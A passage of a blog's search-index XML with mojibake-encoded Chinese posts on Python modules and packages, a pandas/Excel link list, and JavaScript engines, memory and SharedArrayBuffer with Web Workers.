¸çš„ä¸€éƒ¨åˆ†ï¼Œä½†æ˜¯å·²ç»å†…ç½®äºè§£é‡Šå™¨äº†ã€‚è¿™æ—¢æ˜¯ä¸ºäº†æé«˜æ•ˆç‡ï¼Œä¹Ÿæ˜¯ä¸ºäº†ç»™ç³»ç»Ÿè°ƒç”¨ç­‰æ“ä½œç³»ç»ŸåŸç”Ÿè®¿é—®æä¾›æ¥å£ã€‚ ç¬¬ä¸‰æ–¹æ¨¡å—ï¼Œå³é€šè¿‡ pip install çš„æ¨¡å—ã€‚ è‡ªå®šä¹‰æ¨¡å—ï¼Œå³ç”¨æˆ·è‡ªå·±ç¼–å†™çš„æ¨¡å—ã€‚ ä¸¾ä¸ª ğŸŒ°ï¼Œæˆ‘ä»¬å†™ä¸€ä¸ªæ¨¡å— fibo.py ï¼š 1234567891011121314# write Fibonacci series up to ndef fib(n): a, b = 0, 1 while a &lt; n: print(a) a, b = b, a+b# return Fibonacci series up to ndef fib2(n): result = [] a, b = 0, 1 while a &lt; n: result.append(a) a, b = b, a+b æ¨¡å—å¯¼å…¥å¯¼å…¥æ¨¡å—çš„æ–¹å¼æœ‰ä»¥ä¸‹ 2 ç§ï¼š import module è¿™æ˜¯æ¨¡å— å®Œå…¨å¼•å…¥ çš„æ–¹å¼ã€‚ æ¯”å¦‚ import os ä¼šæŠŠ os ä¸‹é¢çš„æ‰€æœ‰çš„å˜é‡ã€å‡½æ•°ã€ç±»å…¨éƒ¨å¼•å…¥ï¼Œé€šè¿‡ os å¯ä»¥è®¿é—®æ¨¡å—ä¸­çš„å˜é‡æˆ–å‡½æ•°ï¼Œå¦‚ os.listdir()ã€‚ å½“ç„¶ä¹Ÿå¯ä»¥é€šè¿‡ import module as xx çš„æ–¹å¼ï¼Œä¸ºæ¨¡å—èµ·ä¸€ä¸ªåˆ«åã€‚ from module import func1, func2 è¿™æ˜¯æ¨¡å— éƒ¨åˆ†å¼•å…¥ çš„æ–¹å¼ã€‚æŒ‰éœ€å¼•å…¥éœ€è¦æ¨¡å—ä¸­å®šä¹‰çš„å‡½æ•°ï¼Œå¦ä¸€ä¸ªå¥½å¤„æ˜¯å¯ä»¥ç›´æ¥åœ¨è„šæœ¬ä¸­ä½¿ç”¨å¤åˆ¶åçš„å˜é‡åã€‚ ä¸¾ä¸ªğŸŒ°ï¼Œç°åœ¨è¿›å…¥ Python è§£é‡Šå™¨å¯¼å…¥è¯¥æ¨¡å—ï¼š 12&gt;&gt;&gt; import fibo&gt;&gt;&gt; å¯ä»¥çœ‹åˆ°å½“å‰æ²¡æœ‰ä»»ä½•è¾“å‡ºï¼Œå› ä¸ºå¯¼å…¥æ¨¡å—çš„æ“ä½œï¼Œåªæ˜¯è¿›å…¥åˆ°æ¨¡å—å fibo ä¸­ï¼Œå¹¶ä¸ä¼šç›´æ¥è¿›å…¥åˆ°å®šä¹‰åœ¨ fibo å‡½æ•°å†…ã€‚å¯ä»¥ç”¨æ¨¡å—åè®¿é—®è¿™äº›å‡½æ•°: 123456789&gt;&gt;&gt; import fibo&gt;&gt;&gt; fibo.fib(10)0112358 æ¨¡å—æ‰§è¡Œå¦‚æœéœ€è¦è®©ä¸€ä¸ª .py æ–‡ä»¶æ—¢å½“ä½œè„šæœ¬åˆèƒ½å½“ä½œæ¨¡å—ç”¨ï¼Œå¯ä»¥ä½¿ç”¨ __name__ è¿™ä¸ªå±æ€§ã€‚åªæœ‰å½“æ–‡ä»¶è¢«å½“ä½œè„šæœ¬æ‰§è¡Œçš„æ—¶å€™ï¼Œ __name__ çš„å€¼æ‰ä¼šæ˜¯ &#39;__main__&#39;ï¼Œè€Œæ¨¡å—å¯¼å…¥æ—¶ä¸ä¼šã€‚ ä¸‹é¢ï¼Œæˆ‘ä»¬æ”¹é€ ä¸€ä¸‹ä¸Šè¿° fibo æ¨¡å—ï¼Œåœ¨æœ«å°¾æ·»åŠ ä¸€æ®µä»£ç ï¼š 123456789101112131415161718# write Fibonacci series up to ndef fib(n): a, b = 0, 1 while a &lt; n: print(a) a, b = b, a+b# return Fibonacci series up to ndef fib2(n): result = [] a, b = 0, 1 while a &lt; n: result.append(a) a, b = b, a+b# ä½œä¸ºè„šæœ¬æ¥æ‰§è¡Œæ¨¡å—if __name__ == &apos;__main__&apos; : fib(10) ç„¶åè¿è¡Œ Python æ¨¡å—ï¼š 12345678&gt;&gt;&gt; python fibo.py 0112358 å¯ä»¥çœ‹åˆ°æ¨¡å—é‡Œçš„ä»£ç ä¼šè¢«æ‰§è¡Œï¼Œå°±å¥½åƒå·²å¯¼å…¥æ¨¡å—ä¸€æ ·ã€‚ æ¨¡å—åŠ è½½æœºåˆ¶ åŠ¨æ€åŠ è½½æ¨¡å—ä½†æ˜¯importåªèƒ½å¤ŸåŠ è½½å›ºå®šåç§°æ¨¡å—ï¼Œä¸èƒ½åŠ è½½åŠ¨æ€æ¯”å¦‚å­—ç¬¦ä¸²åç§°æ¨¡å—ï¼Œæ¯”å¦‚ str = â€˜toolsâ€™import str å¥½äº†ï¼Œç°åœ¨è§£å†³äº†åŠ¨æ€åŠ è½½éšæ„æ¨¡å—çš„é—®é¢˜äº†ï¼Œä½†æ˜¯è·ç¦»æˆåŠŸè¿˜æœ‰ä¸€æ­¥ä¹‹é¥ï¼Œåœ¨pythoné‡Œé¢ï¼ŒåŠ è½½æ¨¡å—æ˜¯æœ‰ç¼“å­˜çš„ï¼Œæ„æ€å°±æ˜¯è¯´ï¼ŒåŠ è½½tools.pyä¹‹åï¼Œå°±ç®—tools.pyå†…å®¹å‘ç”Ÿæ”¹å˜äº†ï¼Œéƒ½ä¸ä¼šé‡æ–°åŠ è½½ï¼Œè¿˜æ˜¯æ— æ³•æ»¡è¶³æˆ‘ä»¬å®æ—¶æ›´æ–°åŠ è½½æ¨¡å—çš„éœ€æ±‚ã€‚è¿™é‡Œæœ‰ä¸ªæ¯”è¾ƒç®€å•çš„åŠæ³•ï¼Œå¯ä»¥ä½¿å¾—æ¨¡å—æœ‰éœ€è¦çš„æ—¶å€™é‡æ–°åŠ è½½ï¼Œå›æƒ³ä¹‹å‰æˆ‘ä»¬è¯´è¿‡ï¼ŒpythonåŠ è½½åçš„æ¨¡å—éƒ½ä¼šä¿å­˜åœ¨sys.modulesé‡Œé¢ï¼Œæˆ‘ä»¬åªéœ€è¦åœ¨é‡æ–°åŠ è½½æ¨¡å—ä¹‹å‰ï¼ŒæŠŠæ¨¡å—ä»sys.modulesé‡Œé¢åˆ é™¤å³å¯ã€‚ del sys.modules[â€˜toolsâ€™]import(â€˜toolsâ€™) Python åŒ… ä¸ºäº†å¸®åŠ©ç»„ç»‡æ¨¡å—å¹¶æä¾›åç§°å±‚æ¬¡ç»“æ„ï¼ŒPython è¿˜å¼•å…¥äº†åŒ…çš„æ¦‚å¿µã€‚å¯ä»¥æŠŠåŒ…çœ‹æˆæ˜¯æ–‡ä»¶ç³»ç»Ÿä¸­çš„ç›®å½•ï¼Œå¹¶æŠŠæ¨¡å—çœ‹æˆæ˜¯ç›®å½•ä¸­çš„æ–‡ä»¶ï¼Œä½†è¯·ä¸è¦å¯¹è¿™ä¸ªç±»ä¼¼åšè¿‡äºå­—é¢çš„ç†è§£ï¼Œå› ä¸ºåŒ…å’Œæ¨¡å—ä¸æ˜¯å¿…é¡»æ¥è‡ªäºæ–‡ä»¶ç³»ç»Ÿã€‚ ä¸æ–‡ä»¶ç³»ç»Ÿä¸€æ ·ï¼ŒåŒ…é€šè¿‡å±‚æ¬¡ç»“æ„è¿›è¡Œç»„ç»‡ï¼Œåœ¨åŒ…ä¹‹å†…é™¤äº†ä¸€èˆ¬çš„æ¨¡å—ï¼Œè¿˜å¯ä»¥æœ‰å­åŒ…ã€‚ ç®€å•åœ°æ¥è¯´ï¼Œâ€åŒ…â€œ (package) æ˜¯å«æœ‰ Python æ¨¡å—çš„æ–‡ä»¶å¤¹ï¼Œä¸è¿‡å‰ææ¡ä»¶æ˜¯è¿™ä¸ªæ–‡ä»¶å¤¹ä¸‹å¿…é¡»å­˜åœ¨ __init__.py æ–‡ä»¶ã€‚ ä»€ä¹ˆæ˜¯ __init__.py æ–‡ä»¶å½“æ–‡ä»¶å¤¹ä¸‹å­˜åœ¨ __init__.py æ–‡ä»¶æ—¶æ„å‘³ç€è¯¥æ–‡ä»¶å¤¹æ˜¯ä¸€ä¸ªåŒ…ï¼Œ__init__.py æ–‡ä»¶ç”¨äºç»„ç»‡åŒ…ï¼Œç®¡ç†å„ä¸ªæ¨¡å—ä¹‹é—´çš„å¼•ç”¨ã€æ§åˆ¶åŒ…çš„å¯¼å…¥è¡Œä¸ºã€‚ å°è£…åŒ…æ—¶ç¡®ä¿æ¯ä¸ªç›®å½•éƒ½å®šä¹‰äº†ä¸€ä¸ª __init__.py æ–‡ä»¶ï¼Œä¸¾ä¸ªğŸŒ°ï¼š 123456789â”œâ”€â”€ package # é¡¶å±‚ç›®å½•â”œâ”€â”€ init.py â”œâ”€â”€ subPackage1 # å­åŒ… â”‚ â”œâ”€â”€ init.py â”‚ â”œâ”€â”€ module1 â”‚ â”œâ”€â”€ module1 â”œâ”€â”€ subPackage2 # å­åŒ… â”‚ â”œâ”€â”€ init.py â”‚ â”œâ”€â”€ module2 ç»„ç»‡å¥½ç›®å½•ç»“æ„å’Œä»£ç åï¼Œä¾¿å¯ä»¥æ‰§è¡Œä»¥ä¸‹ import è¯­å¥ï¼š 123import package.subPackage1.module1from package.subPackage1 import module1import package.subPackage2.module2 as module2 __init__.py æ–‡ä»¶çš„ç›®çš„æ˜¯è¦åŒ…å«ä¸åŒè¿è¡Œçº§åˆ«çš„åŒ…çš„å¯é€‰çš„åˆå§‹åŒ–ä»£ç ï¼Œå¯¼å…¥ä¸€ä¸ªåŒ…æ—¶ä¼šå…ˆå¯¼å…¥çš„å®ƒçš„ __init__.py æ–‡ä»¶å¹¶è‡ªåŠ¨è¿è¡Œã€‚ ä¸¾ä¸ªğŸŒ°ï¼Œæ‰§è¡Œè¯­å¥ import package.subPackage1.module1 æ—¶ï¼Œæ–‡ä»¶ package/__init__.py å°†è¢«å¯¼å…¥ï¼Œå»ºç«‹ package å‘½åç©ºé—´çš„å†…å®¹ï¼Œä¸” package/__init__.py å°†åœ¨æ–‡ä»¶ package/subPackage1/__init__.py å¯¼å…¥ä¹‹å‰å¯¼å…¥ã€‚ ä¸€èˆ¬æƒ…å†µä¸‹ __init__.py æ–‡ä»¶å¯ä»¥ä¸ºç©ºï¼Œä½†æ˜¯æœ‰çš„æ—¶å€™ä¹Ÿå¯ä»¥åœ¨ __init__.py ä¸­å¯¼å…¥å…¶ä»–çš„åŒ…æˆ–æ¨¡å—ï¼š 12# package/subPackage1/__init__.pyfrom . import module1 äºæ˜¯å°±å¯ä»¥é€šè¿‡ import package.subPackage1 ä»£æ›¿ import package.subPackage1.module1 æ¥å¯¼å…¥æ¨¡å—äº†ã€‚ åŒ…å¯¼å…¥ä½¿ç”¨ç›¸å¯¹è·¯å¾„åå¯¼å…¥åŒ…ä¸­å­æ¨¡å—å‚è€ƒæ–‡æ¡£ ã€å®˜æ–¹æ–‡æ¡£ã€‘â€” å¯¼å…¥ç³»ç»Ÿ Python _init_.py ä½œç”¨è¯¦è§£ Pythonæºç å‰–æç¬”è®°3-Pythonæ‰§è¡ŒåŸç†åˆæ¢]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title></title>
    <url>%2F2019%2F08%2F21%2FPython%2Fpandas%20%E7%9A%84%20excel%20%E5%BA%94%E7%94%A8%2F</url>
    <content type="text"><![CDATA[ç”¨ python åšæ•°æ®åˆ†æï¼špandas çš„ excel åº”ç”¨åˆæ¢ï¼šhttps://zhuanlan.zhihu.com/p/32338530 Pythonå®ç°EXCELå¸¸ç”¨æ“ä½œâ€”â€”pandasç®€ä»‹ï¼šhttps://zhuanlan.zhihu.com/p/34541791 XlsxWriterï¼šhttps://xlsxwriter.readthedocs.io/ python å’Œ node.js äº¤äº’(node.jsä¸­æ‰§è¡Œpythonå‡½æ•°)ï¼šhttps://blog.csdn.net/qq_23057645/article/details/80967657]]></content>
  </entry>
  <entry>
    <title><![CDATA[js å¼•æ“ï¼ˆä¸€ï¼‰]]></title>
    <url>%2F2019%2F08%2F18%2FWeb%E5%89%8D%E7%AB%AF%2Fjs%20%E5%BC%95%E6%93%8E%E7%B3%BB%E5%88%97%EF%BC%88%E4%B8%80%EF%BC%89%2F</url>
    <content type="text"><![CDATA[åœ¨ Facebook å‘å¸ƒ Hermes å¼•æ“ä¹‹å‰ï¼ŒFabrice Bellard ä»¥åŠ C è¯­è¨€ä¸“å®¶ Charlie Gordon å…¬å¼€å‘å¸ƒäº† QuickJSã€‚ Facebookå‘å¸ƒå…¨æ–°JSå¼•æ“ï¼ä¸“æ³¨æé«˜React Nativeåº”ç”¨çš„æ€§èƒ½ ä¸ºäº†æé«˜ Facebook åº”ç”¨çš„æ€§èƒ½ï¼Œæˆ‘ä»¬çš„å›¢é˜Ÿä¸æ–­æ”¹è¿›è‡ªå·±çš„ JavaScript ä»£ç å’Œå¹³å°ã€‚åœ¨åˆ†ææ€§èƒ½æ•°æ®æ—¶ï¼Œæˆ‘ä»¬å‘ç° JavaScript å¼•æ“æœ¬èº«æ˜¯å½±å“å¯åŠ¨æ€§èƒ½å’Œåº”ç”¨åŒ…ä½“ç§¯çš„é‡è¦å› ç´ ã€‚æœ‰äº†è¿™äº›æ•°æ®ï¼Œæˆ‘ä»¬æ„è¯†åˆ°å¿…é¡»åœ¨æ¯” PC ç«¯é™åˆ¶æ›´å¤šçš„ç§»åŠ¨ç¯å¢ƒä¸­ä¼˜åŒ– JavaScript æ€§èƒ½ã€‚å°è¯•äº†å„ç§æ–¹æ¡ˆåï¼Œæˆ‘ä»¬æ„å»ºäº†ä¸€ä¸ªæ–°çš„ JavaScript å¼•æ“ï¼šHermesã€‚å®ƒæ—¨åœ¨æé«˜åº”ç”¨æ€§èƒ½ï¼Œä¸“æ³¨äº React Native åº”ç”¨ï¼Œå¹¶ä¸”åœ¨å¸‚é¢ä¸Šé‚£äº›å†…å­˜è¾ƒå°‘ã€å­˜å‚¨é€Ÿåº¦è¾ƒæ…¢ä¸”è®¡ç®—èƒ½åŠ›ä½ä¸‹çš„ç§»åŠ¨è®¾å¤‡ä¸Šéƒ½æœ‰è‰¯å¥½çš„è¡¨ç°ã€‚ ä¸»è¦ç‰¹ç‚¹ï¼š å­—èŠ‚ç é¢„ç¼–è¯‘ æ—  JIT åƒåœ¾å›æ”¶ç­–ç•¥ è½»é‡å¯åµŒå…¥çš„QuickJSå¼•æ“é‡ç£…å¼€æºï¼Œå®ƒä¼šæ˜¯ä¸‹ä¸€ä¸ªV8å—ï¼Ÿ ä¸€è·¯å¼€æŒ‚çš„ä½œè€… Fabrice Bellard æ˜¯ä¸€ä½æ³•å›½è‘—åçš„è®¡ç®—æœºç¨‹åºå‘˜ï¼Œå›  FFmpegã€QEMU ç­‰é¡¹ç›®è€Œé—»åä¸šå†…ã€‚ä»–ä¹Ÿæ˜¯æœ€å¿«åœ†å‘¨ç‡ç®—æ³•è´æ‹‰å…¬å¼ã€TCCBOOT å’Œ TCC ç­‰é¡¹ç›®çš„ä½œè€…ã€‚ QuickJS æ”¯æŒ ES2019 è§„èŒƒï¼ŒåŒ…æ‹¬æ¨¡å—ï¼Œå¼‚æ­¥ç”Ÿæˆå™¨å’Œä»£ç†ï¼Œä¸»è¦ç‰¹ç‚¹ï¼š å°å·§ä¸”æ˜“äºåµŒå…¥ï¼šåªéœ€å‡ ä¸ª C æ–‡ä»¶ï¼Œæ— å¤–éƒ¨ä¾èµ–ï¼Œx86 ä¸‹ä¸€ä¸ªç®€å•çš„ hello world ç¤ºä¾‹ç¨‹åºä»… 190 KB çš„å¤§å°ã€‚ å…·æœ‰æä½å¯åŠ¨æ—¶é—´çš„å¿«é€Ÿè§£é‡Šå™¨ï¼šåœ¨å°å¼ PC çš„å•æ ¸ä¸Šï¼Œåœ¨å¤§çº¦ 100 ç§’å†…è¿è¡Œ ECMAScript æµ‹è¯•å¥—ä»¶56000 æ¬¡æµ‹è¯•ã€‚è¿è¡Œæ—¶å®ä¾‹çš„å®Œæ•´ç”Ÿå‘½å‘¨æœŸåœ¨ä¸åˆ° 300 å¾®ç§’çš„æ—¶é—´å†…å®Œæˆã€‚ æ”¯æŒ ES2019 ï¼ŒåŒ…æ‹¬æ¨¡å—ã€å¼‚æ­¥ç”Ÿæˆå™¨å’Œå®Œæ•´çš„ Annex B æ”¯æŒï¼ˆä¼ ç»Ÿçš„ Web å…¼å®¹æ€§ï¼‰ã€‚ 100ï¼…çš„é€šè¿‡äº† ECMAScript æµ‹è¯•ç”¨ä¾‹ã€‚ å¯ä»¥å°† Javascript æºç¼–è¯‘ä¸ºæ²¡æœ‰å¤–éƒ¨ä¾èµ–çš„å¯æ‰§è¡Œæ–‡ä»¶ã€‚ ä½¿ç”¨å¼•ç”¨è®¡æ•°ï¼ˆä»¥å‡å°‘å†…å­˜ä½¿ç”¨å¹¶å…·æœ‰ç¡®å®šæ€§è¡Œä¸ºï¼‰çš„åƒåœ¾æ”¶é›†ä¸å¾ªç¯åˆ é™¤ã€‚ æ•°å­¦æ‰©å±•ï¼šBigIntï¼ŒBigFloatï¼Œè¿ç®—ç¬¦é‡è½½ï¼Œbigint æ¨¡å¼ï¼Œæ•°å­¦æ¨¡å¼ã€‚ åœ¨ Javascript ä¸­å®ç°çš„å…·æœ‰ä¸Šä¸‹æ–‡ç€è‰²çš„å‘½ä»¤è¡Œè§£é‡Šå™¨ã€‚ å¸¦æœ‰ C åº“åŒ…è£…åº“æ„å»ºçš„å†…ç½®æ ‡å‡†åº“ã€‚ PS: å‰ç«¯æ€§èƒ½ä¼˜åŒ–ç»ˆäºèµ°åˆ°äº† js å¼•æ“çš„å±‚é¢ã€‚ä¸ºäº†æ›´å¥½åœ°åœ°äº†è§£å¼•æ“æŠ€æœ¯ï¼Œæˆ‘ä»¬å…ˆæ¥æ¸©æ•…ä¸€ä¸‹ js åŸºç¡€æœºåˆ¶ï¼šå¼€å‘åšäº†è¿™ä¹ˆå¤šå¹´ï¼Œä½ çœŸçš„äº†è§£JSå·¥ä½œæœºåˆ¶å—ï¼Ÿ JIT å°† JS è§†ä¸ºä¸€ç§è§£é‡Šæ€§è¯­è¨€æ˜¯ä¸å¯¹çš„ã€‚ä»¥å‰å¾ˆå¤šå¹´ JS çš„ç¡®æ˜¯è§£é‡Šæ€§çš„ï¼Œä½†æœ€è¿‘å‡ºç°äº†ä¸€äº›å˜åŒ–ï¼Œè¿™ç§å‡è®¾ä¹Ÿéšä¹‹è¿‡æ—¶äº†ã€‚è®¸å¤šæµè¡Œçš„ JS å¼•æ“ä¸ºäº†ä½¿ JS æ‰§è¡Œæ›´å¿«ï¼Œå¼•å…¥äº†ä¸€ç§ç§°ä¸º Just-In-Time ç¼–è¯‘çš„åŠŸèƒ½ã€‚ç®€è€Œè¨€ä¹‹ï¼Œè¿™æ„å‘³ç€ JS ä»£ç ä¼šåœ¨æ‰§è¡ŒæœŸé—´ç›´æ¥ç¼–è¯‘æˆæœºå™¨ç ï¼ˆè‡³å°‘ V8 æ˜¯è¿™æ ·åšçš„ï¼‰ï¼Œä¸å†æœ‰è§£é‡Šè¿™ä¸€æ­¥ã€‚è¿™ä¸ªæµç¨‹è€—æ—¶ç¨é•¿ï¼Œä½†è¾“å‡ºçš„ç»“æœæ€§èƒ½æ›´å¼ºã€‚ä¸ºäº†åœ¨æœ‰é™çš„æ—¶é—´å†…å®Œæˆå·¥ä½œï¼ŒV8 å®é™…ä¸Šæœ‰ä¸¤ä¸ªç¼–è¯‘å™¨ï¼ˆä¸ç®—ä¸ WebAssembly ç›¸å…³çš„å†…å®¹ï¼‰ã€‚å…¶ä¸­ä¸€ä¸ªæ˜¯é€šç”¨çš„ï¼Œèƒ½å¤Ÿéå¸¸å¿«åœ°ç¼–è¯‘ä»»ä½• JS ä»£ç ï¼Œä½†åªè¾“å‡ºæ€§èƒ½ä¸€èˆ¬çš„ç»“æœï¼›è€Œå¦ä¸€ä¸ªç¼–è¯‘é€Ÿåº¦æœ‰ç‚¹æ…¢ï¼Œæ˜¯ç”¨æ¥ç¼–è¯‘å¸¸ç”¨ä»£ç çš„ï¼Œå…¶è¾“å‡ºç»“æœæ€§èƒ½æé«˜ã€‚å½“ç„¶ï¼Œå› ä¸º JS æœ‰åŠ¨æ€ç±»å‹çš„ç‰¹æ€§ï¼Œè¿™äº›ç¼–è¯‘å™¨ä¹Ÿä¸å¥½åšã€‚æ‰€ä»¥ç±»å‹ä¸å˜çš„æƒ…å†µä¸‹ç¬¬äºŒä¸ªç¼–è¯‘å™¨çš„æ•ˆæœæœ€å¥½ï¼Œèƒ½è®©ä½ çš„ä»£ç è¿è¡Œèµ·æ¥å¿«å¾—å¤šã€‚ å †å’Œæ ˆ åœ¨ JS ä»£ç çš„æ‰§è¡Œè¿‡ç¨‹ä¸­ä¼šåˆ†é…ä¸¤ä¸ªå†…å­˜åŒºåŸŸâ€”â€”è°ƒç”¨æ ˆå’Œ å †ã€‚ç¬¬ä¸€ä¸ªæ€§èƒ½éå¸¸é«˜ï¼Œå› æ­¤ç”¨äºè¿ç»­æ‰§è¡Œæ‰€æä¾›çš„å‡½æ•°ã€‚æ¯ä¸ªå‡½æ•°è°ƒç”¨åœ¨è°ƒç”¨æ ˆä¸­åˆ›å»ºä¸€ä¸ªæ‰€è°“çš„â€œæ¡†æ¶â€ï¼Œå…¶ä¸­åŒ…å«å…¶å±€éƒ¨å˜é‡çš„å‰¯æœ¬å’Œ thisã€‚ä½ å¯ä»¥é€šè¿‡ Chrome è°ƒè¯•å™¨æŸ¥çœ‹å®ƒã€‚å°±åƒåœ¨å…¶ä»–ä¸å †æ ˆç±»ä¼¼çš„æ•°æ®ç»“æ„ä¸­ä¸€æ ·ï¼Œè°ƒç”¨æ ˆçš„å¸§è¢«æ¨é€æˆ–å¼¹å‡ºå †æ ˆï¼Œå…·ä½“å–å†³äºæ­£åœ¨æ‰§è¡Œæˆ–ç»ˆæ­¢çš„æ–°å‡½æ•°ã€‚ä½ å¯èƒ½è§è¿‡è°ƒç”¨æ ˆä¸Šé™æº¢å‡ºé”™è¯¯ï¼Œé€šå¸¸æ˜¯ç”±äºæŸç§å½¢å¼çš„æ— é™å¾ªç¯å¯¼è‡´çš„ã€‚ è°ˆåˆ°å †ï¼Œå°±åƒç°å®ç”Ÿæ´»ä¸­ä¸€æ ·ï¼ŒJS å †æ˜¯å­˜å‚¨æœ¬åœ°èŒƒå›´ä¹‹å¤–å¯¹è±¡çš„åœ°æ–¹ã€‚å®ƒæ¯”è°ƒç”¨æ ˆæ…¢å¾—å¤šã€‚è¿™å°±æ˜¯ä¸ºä»€ä¹ˆè®¿é—®æœ¬åœ°å˜é‡æ—¶é€Ÿåº¦å¯èƒ½ä¼šå¿«å¾ˆå¤šã€‚å †ä¹Ÿæ˜¯å­˜æ”¾æœªè¢«è®¿é—®æˆ–ä½¿ç”¨çš„å¯¹è±¡çš„åœ°æ–¹ï¼Œè¿™ç§å¯¹è±¡å°±æ˜¯åƒåœ¾ã€‚æœ‰åƒåœ¾å°±è¦æœ‰åƒåœ¾å›æ”¶å™¨ã€‚éœ€è¦æ—¶ JS è¿è¡Œæ—¶çš„åƒåœ¾å›æ”¶å™¨å°±ä¼šæ¿€æ´»ï¼Œæ¸…ç†å †å¹¶é‡Šæ”¾å†…å­˜ã€‚ å‰ç«¯å†…å­˜ç›¸å…³æ¢ç´¢ å †å’Œæ ˆ åœ¨å‰ç«¯ä¸­ï¼Œè¢«å­˜å‚¨åœ¨æ ˆå†…çš„æ•°æ®åŒ…æ‹¬å°æ•°å€¼å‹ï¼Œstring ï¼Œboolean å’Œå¤æ‚ç±»å‹çš„åœ°å€ç´¢å¼•ã€‚æ‰€è°“å°æ•°å€¼æ•°æ®(small number), å³é•¿åº¦çŸ­äº 32 ä½å­˜å‚¨ç©ºé—´çš„ number å‹æ•°æ®ã€‚ä¸€äº›å¤æ‚çš„æ•°æ®ç±»å‹ï¼Œè¯¸å¦‚ Arrayï¼ŒObject ç­‰ï¼Œæ˜¯è¢«å­˜åœ¨å †ä¸­çš„ã€‚ å…±äº«å†…å­˜ å½“ç¨‹åºå˜çš„è¿‡äºå¤æ‚æ—¶ï¼Œæˆ‘ä»¬å¸Œæœ›é€šè¿‡ webworker æ¥å¼€å¯æ–°çš„ç‹¬ç«‹çº¿ç¨‹ï¼Œå®Œæˆç‹¬ç«‹è®¡ç®—ã€‚ å¼€å¯æ–°çš„çº¿ç¨‹ä¼´éšè€Œæ¥çš„é—®é¢˜å°±æ˜¯é€šè®¯é—®é¢˜ã€‚webworker çš„ postMessage å¯ä»¥å¸®åŠ©æˆ‘ä»¬å®Œæˆé€šä¿¡ï¼Œä½†æ˜¯è¿™ç§é€šä¿¡æœºåˆ¶æ˜¯å°†æ•°æ®ä»ä¸€éƒ¨åˆ†å†…å­˜ç©ºé—´å¤åˆ¶åˆ°ä¸»çº¿ç¨‹çš„å†…å­˜ä¸‹ã€‚è¿™ä¸ªèµ‹å€¼è¿‡ç¨‹å°±ä¼šé€ æˆæ€§èƒ½çš„æ¶ˆè€—ã€‚ è€Œå…±äº«å†…å­˜ï¼Œé¡¾åæ€ä¹‰ï¼Œå¯ä»¥è®©æˆ‘ä»¬åœ¨ä¸åŒçš„çº¿ç¨‹é—´ï¼Œå…±äº«ä¸€å—å†…å­˜ï¼Œè¿™äº›ç°æˆéƒ½å¯ä»¥å¯¹å†…å­˜è¿›è¡Œæ“ä½œï¼Œä¹Ÿå¯ä»¥è¯»å–è¿™å—å†…å­˜ã€‚çœå»äº†èµ‹å€¼æ•°æ®çš„è¿‡ç¨‹ï¼Œä¸è¨€è€Œå–»ï¼Œæ•´ä¸ªæ€§èƒ½ä¼šæœ‰è¾ƒå¤§å¹…åº¦çš„æå‡ã€‚ ä½¿ç”¨åŸå§‹çš„ postMessage æ–¹æ³•è¿›è¡Œæ•°æ®ä¼ è¾“ä½¿ç”¨ï¼Œæ¯ä¸€ä¸ªæ¶ˆæ¯å†…çš„æ•°æ®åœ¨ä¸åŒçš„çº¿ç¨‹ä¸­ï¼Œéƒ½æ˜¯è¢«å…‹éš†ä¸€ä»½ä»¥åå†ä¼ è¾“çš„ã€‚æ•°æ®é‡è¶Šå¤§ï¼Œæ•°æ®ä¼ è¾“é€Ÿåº¦è¶Šæ…¢ã€‚ sharedBufferArray çš„æ¶ˆæ¯ä¼ é€’é€šè¿‡å…±äº«å†…å­˜ä¼ é€’çš„æ•°æ®ï¼Œåœ¨ worker ä¸­æ”¹å˜äº†æ•°æ®ä»¥åï¼Œä¸»çº¿ç¨‹çš„åŸå§‹æ•°æ®ä¹Ÿè¢«æ”¹å˜äº†ã€‚ main.js 1234567891011121314151617181920var worker = new Worker(&apos;./sharedArrayBufferWorker.js&apos;);worker.onmessage = function(e)&#123; // ä¼ å›åˆ°ä¸»çº¿ç¨‹å·²ç»è¢«è®¡ç®—è¿‡çš„æ•°æ® console.log(&quot;e.data&quot;,&quot; -- &quot;, e.data ); // SharedArrayBuffer(3) &#123;&#125; // å’Œä¼ ç»Ÿçš„ postMessage æ–¹å¼å¯¹æ¯”ï¼Œå‘ç°ä¸»çº¿ç¨‹çš„åŸå§‹æ•°æ®å‘ç”Ÿäº†æ”¹å˜ console.log(&quot;int8Array-outer&quot;,&quot; -- &quot;, int8Array ); // Int8Array(3) [2, 3, 4]&#125;;var sharedArrayBuffer = new SharedArrayBuffer(3);var int8Array = new Int8Array(sharedArrayBuffer);int8Array[0] = 1;int8Array[1] = 2;int8Array[2] = 3;worker.postMessage(sharedArrayBuffer); worker.js 12345678910111213onmessage = function(e)&#123; var arrayData = increaseData(e.data); postMessage(arrayData);&#125;;function increaseData(arrayData)&#123; var int8Array = new Int8Array(arrayData); for(let i = 0; i &lt; int8Array.length; i++)&#123; int8Array[i] += 1; &#125; return arrayData;&#125; å‰ç«¯ Web Workers åˆ°åº•æ˜¯ä»€ä¹ˆï¼Ÿ workerçº¿ç¨‹çš„ä½¿ç”¨æœ‰ä¸€äº›æ³¨æ„ç‚¹ åŒæºé™åˆ¶ workerçº¿ç¨‹æ‰§è¡Œçš„è„šæœ¬æ–‡ä»¶å¿…é¡»å’Œä¸»çº¿ç¨‹çš„è„šæœ¬æ–‡ä»¶åŒæºï¼Œè¿™æ˜¯å½“ç„¶çš„äº†ï¼Œæ€»ä¸èƒ½å…è®¸workerçº¿ç¨‹åˆ°åˆ«äººç”µè„‘ä¸Šåˆ°å¤„è¯»æ–‡ä»¶å§ æ–‡ä»¶é™åˆ¶ ä¸ºäº†å®‰å…¨ï¼Œworkerçº¿ç¨‹æ— æ³•è¯»å–æœ¬åœ°æ–‡ä»¶ï¼Œå®ƒæ‰€åŠ è½½çš„è„šæœ¬å¿…é¡»æ¥è‡ªç½‘ç»œï¼Œä¸”éœ€è¦ä¸ä¸»çº¿ç¨‹çš„è„šæœ¬åŒæº DOMæ“ä½œé™åˆ¶ workerçº¿ç¨‹åœ¨ä¸ä¸»çº¿ç¨‹çš„windowä¸åŒçš„å¦ä¸€ä¸ªå…¨å±€ä¸Šä¸‹æ–‡ä¸­è¿è¡Œï¼Œå…¶ä¸­æ— æ³•è¯»å–ä¸»çº¿ç¨‹æ‰€åœ¨ç½‘é¡µçš„DOMå¯¹è±¡ï¼Œä¹Ÿä¸èƒ½è·å– documentã€ windowç­‰å¯¹è±¡ï¼Œä½†æ˜¯å¯ä»¥è·å– navigatorã€ location(åªè¯»)ã€XMLHttpRequestã€ 